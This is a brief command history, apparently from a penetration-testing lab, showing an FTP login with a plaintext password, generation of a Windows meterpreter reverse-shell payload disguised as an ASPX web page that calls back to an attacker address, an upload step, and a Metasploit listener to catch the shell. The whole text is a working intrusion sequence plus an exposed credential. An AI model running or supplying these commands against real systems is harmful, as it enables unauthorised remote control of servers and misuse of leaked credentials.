...
# Command History
```c
ftp ftp_jp@192.168.207.226 -p 24621
pass: ~be<3@6fe1Z:2e8

sudo msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.186 LPORT=445 -f aspx -o aspx445.aspx
// ftp upload
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set lhost 192.168.45.186; set lport 445; exploit"
